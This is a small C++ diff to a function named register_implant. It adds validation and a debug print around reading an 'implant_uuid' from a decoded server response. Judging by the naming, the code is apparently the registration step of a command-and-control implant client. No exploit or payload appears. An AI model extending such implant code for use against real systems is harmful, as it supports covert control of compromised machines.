@@ -26,8 +26,13 @@ std::string register_implant() {
 
         nlohmann::json task_data = decode_msgpack_task(http_response_buffer);
 
-        return task_data["implant_uuid"];
-
+        //return task_data["implant_uuid"];
+        //return "019bbe19-2c0e-7ee1-a81a-78d7e1a97ac0"; //placeholder for debugging
+        std::cout << task_data["implant_uuid"] << std::endl;
+        if (task_data.contains("implant_uuid") && task_data["implant_uuid"].is_string()) {
+            return task_data["implant_uuid"];
+        }
+        return "";
     }
     else {
         std::cerr << "Request failed." << std::endl;
